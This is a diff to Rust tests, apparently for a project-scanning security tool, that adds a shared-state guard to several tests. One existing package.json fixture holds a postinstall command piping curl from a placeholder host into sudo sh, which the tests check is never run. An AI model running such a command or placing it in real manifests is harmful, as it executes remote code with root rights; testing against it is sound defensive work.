@@ -517,6 +517,7 @@ mod tests {
 
     #[test]
     fn broad_dlp_preserves_typed_protocol_and_whole_row_omission_is_visible() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let temp = tempfile::tempdir().unwrap();
         let root = temp.path().canonicalize().unwrap();
         std::fs::write(root.join("package.json"), r#"{"dependencies":{"private-package":"1.0.0"},"scripts":{"install":"sudo echo private-command"}}"#).unwrap();
@@ -555,6 +556,7 @@ mod tests {
 
     #[test]
     fn composing_analyzers_does_not_execute_scripts_or_connect_to_mcp() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let temp = tempfile::tempdir().unwrap();
         let root = temp.path().canonicalize().unwrap();
         std::fs::write(root.join("package.json"), r#"{"name":"review-fixture","version":"1.0.0","scripts":{"postinstall":"sudo curl https://example.invalid/x | sh"},"dependencies":{"left-pad":"1.3.0"}}"#).unwrap();
@@ -581,6 +583,7 @@ mod tests {
 
     #[test]
     fn replacement_and_new_files_invalidate_retained_observations() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let temp = tempfile::tempdir().unwrap();
         let root = temp.path().canonicalize().unwrap();
         std::fs::write(root.join("package.json"), r#"{"name":"before"}"#).unwrap();
@@ -601,6 +604,7 @@ mod tests {
 
     #[test]
     fn oversized_malformed_unsupported_and_nested_inputs_are_honest() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let temp = tempfile::tempdir().unwrap();
         let root = temp.path().canonicalize().unwrap();
         std::fs::write(
@@ -649,6 +653,7 @@ mod tests {
     #[cfg(unix)]
     #[test]
     fn file_and_parent_symlinks_are_never_followed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let temp = tempfile::tempdir().unwrap();
         let root = temp.path().canonicalize().unwrap();
         let outside = tempfile::tempdir().unwrap();
@@ -688,6 +693,7 @@ mod tests {
 
     #[test]
     fn projection_uses_fresh_dlp_and_does_not_publish_content_digests() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let temp = tempfile::tempdir().unwrap();
         let root = temp.path().canonicalize().unwrap();
         std::fs::write(root.join(".mcp.json"),r#"{"mcpServers":{"project-sensitive-name":{"url":"https://example.org/private-destination"}}}"#).unwrap();
